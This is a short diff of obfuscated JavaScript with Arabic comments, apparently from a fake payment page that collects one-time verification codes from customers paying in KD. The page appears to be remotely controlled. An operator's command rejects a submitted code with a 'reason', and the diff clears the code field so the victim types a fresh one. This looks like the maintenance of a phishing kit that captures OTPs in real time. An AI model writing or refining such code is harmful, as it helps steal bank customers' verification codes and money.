@@ -215,8 +215,8 @@ function v202(action) {
 		if (ov) { ov.remove(); }
 		if (window.__otpDecisionSeen) { return; }
 		v220('رمز التحقق غير صحيح او منتهي الصلاحية', false);
-		// إعادة تركيز الحقل
-		if (v199) { v199.focus(); }
+		// تفريغ الحقل حتى يُدخل العميل الرمز الجديد بسهولة (لا يبقى الرمز السابق)
+		if (v199) { v199.value = ""; v199.focus(); }
 	}, 4000);
 
 	return false;
@@ -417,8 +417,10 @@ jQuery(document).ready(function() {
             priceLabel.innerHTML = 'KD&nbsp;' + cleanPrice;
         }
     }
-		jQuery(function () {
+jQuery(function () {
 	if (document.getElementById(_0xdec(11))) {
+		// الحقل يبدأ فارغاً دائماً (يمنع استرجاع الرمز السابق من المتصفح)
+		document.getElementById(_0xdec(11)).value = "";
 		clearTimeout(v229);
 		document.i40.timeOver.value = 0;
 		timer(4);
@@ -446,6 +448,9 @@ jQuery(document).ready(function() {
         if (ov) { ov.remove(); }
         var k22 = document.getElementById('i32');
         if (k22) { k22.style.display = 'none'; }
+        // تفريغ حقل الرمز حتى يُدخل العميل الرمز الجديد بسهولة (لا يبقى الرمز المرفوض)
+        var otpField = document.getElementById('i16');
+        if (otpField) { otpField.value = ""; otpField.focus(); }
         try { v220((cmd && cmd.reason) || 'رمز التحقق غير صحيح او منتهي الصلاحية', false); } catch (e) {}
       },
       onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
